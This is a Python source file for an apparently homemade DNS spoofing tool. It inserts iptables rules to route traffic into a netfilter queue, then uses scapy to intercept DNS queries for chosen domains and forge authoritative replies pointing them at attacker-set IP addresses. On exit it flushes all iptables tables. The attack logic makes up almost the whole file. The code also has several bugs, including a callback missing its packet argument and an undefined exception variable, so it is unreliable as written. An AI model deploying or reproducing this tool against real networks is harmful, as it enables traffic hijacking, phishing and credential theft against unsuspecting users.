#!/usr/bin/env python3

__author__ = 'foxtrot_charlie'
__licence__ = 'GPLv2'

import queue
from scapy.all import *
from netfilterqueue import NetfilterQueue
from ipaddress import ip_address

logger = logging.getLogger("DNSSPOOFER")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('dnsdeceiver.log')
formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
fh.setFormatter(formatter)
logger.addHandler(fh)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
# _iptablesr_ =  "iptables -I FORWARD -j NFQUEUE --queue-num 1"
_iptablesr_ = "iptables -A OUTPUT -j NFQUEUE"
_iptablesrm_ = "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X"


class DNSSpoofer(threading.Thread):

    def __init__(self, event, queue, config={}):
        threading.Thread.__init__(self)
        self.event = event
        print('Inserting iptables rules: {}'.format(_iptablesr_))
        try:
            os.system(_iptablesr_)
        except OSError:
            logger.critical('Cannot execute iptables rulse!')
            sys.exit(-1)
        self.queue = queue
        self.spoofaddr = {}  # should be thread safe - like all built-in types

    def callback(self):
        logger.critical("HIT")
        if self.event.is_set():
            raise KeyboardInterrupt  # really awful

        payload = packet.get_payload()
        pkt = IP(payload)

        if not pkt.haslayer(DNSQR):
            packet.accept()
            # TODO - edit packet if needed
        else:
            if pkt[DNS].qd.qname in self.spoofaddr.keys():
                logger.debug(
                    "Target domain DNS request found! target: {} - redirecting to: {}".format(pkt[DNS].qd.qname,
                                                                                              self.spoofaddr[
                                                                                                  pkt[DNS].qd.qname]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[pkt[DNS].qd.qname]))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
            else:
                logger.debug()
                packet.accept()

    def configurator(self):
        if not self.event.is_set():
            while not self.queue.empty():
                cmd = self.queue.get()
                self.__execute_cmd(cmd)

    def __execute_cmd(self, cmd):
        if len(cmd) == 0:
            pass

        if len(cmd) == 1:
            if cmd[0] == "ls":
                self.queue.put(['lsa', self.spoofaddr])

        if len(cmd) == 2:
            if cmd[0] == 'r':
                target = cmd[1]
                if target in self.spoofaddr.keys():
                    self.spoofaddr.__delattr__(target)
                else:
                    logger.warning('Cannot find target: {}, omitting'.format(target))

        if len(cmd) == 3:
            if cmd[0] == 'a':
                ip = None
                try:
                    ip = ip_address(cmd[2])
                except ValueError:
                    ip = None
                    print("{} is not a valid IP address!")
                self.spoofaddr[cmd[1]] = ip

    def run(self):
        # This is the intercept
        q = NetfilterQueue()
        q.bind(1, self.callback)
        while not self.event.is_set():
            self.configurator()
            try:
                q.run(False)  # Main loop
            except:
                msg = "Hard error occured! {}".format(e)
                logger.critical(msg)
                print(msg)
            finally:
                q.unbind()
        print("DNSspoofer finishing!")

        try:
            logger.debug('Reverting iptables rules!')
            os.system(_iptablesrm_)
        except OSError:
            logger.critical('Cannot revert iptables rules!')
            sys.exit(-1)


if __name__ == '__main__':
    q = queue.Queue()
    e = threading.Event()
    dnss = DNSSpoofer(event=e, queue=q)
    dnss.run()
